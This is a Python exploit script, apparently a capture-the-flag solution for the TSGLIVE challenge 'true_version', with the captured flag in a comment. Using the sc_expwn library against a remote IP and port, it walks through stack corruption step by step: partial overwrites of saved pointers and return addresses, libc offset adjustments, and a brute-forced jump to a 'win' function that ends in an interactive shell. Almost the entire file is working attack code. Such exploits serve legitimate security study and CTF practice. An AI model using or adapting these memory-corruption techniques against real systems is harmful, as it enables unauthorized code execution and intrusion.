#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './true_version'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'35.187.196.197', 'port':30022})
env.set_item('offset_libc_start_main_ret',  debug = 0x89, local = 0x89, remote = 0x7c)
env.set_item('offset_stack_ret2main',       debug = 0x10, local = 0x10, remote = 0x20)
env.select()

#==========

binf = ELF(bin_file)
offset_win  = binf.sep_function['win']

#==========

def attack(conn, **kwargs):
    conn.sendlineafter(b'> ', b'hoge')
    conn.sendlineafter(b'> ', b'fuga')
    conn.sendlineafter(b'> ', b'0')
    conn.sendlineafter(b'> ', b'piyo')

    stack_offset = 0x60

    exploit  = b'\xfe'*0x20
    exploit += p8(stack_offset)
    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'> ', exploit)

    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'> ', p8(env.offset_libc_start_main_ret))

    exploit  = b'\x00'*0xe8
    exploit += p8(stack_offset + env.offset_stack_ret2main)
    conn.sendlineafter(b'> ', b'2')
    conn.sendlineafter(b'> ', exploit)
    if not conn.recvuntil(b'?', timeout=0.1):
        raise
    conn.sendline(b'NO')

    conn.sendlineafter(b'> ', b'4')
    conn.sendlineafter(b'> ', p8(offset_win & 0xff))

    conn.sendlineafter(b'luck', b'echo hoge')
    conn.recvuntil(b'hoge')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.bruteforce(attack)
    comn.interactive()
    # TSGLIVE{all_ch3ck53c_and_n0_addr355_l3ak_but_3xpl01tabl3}

if __name__=='__main__':
    main()

#==========
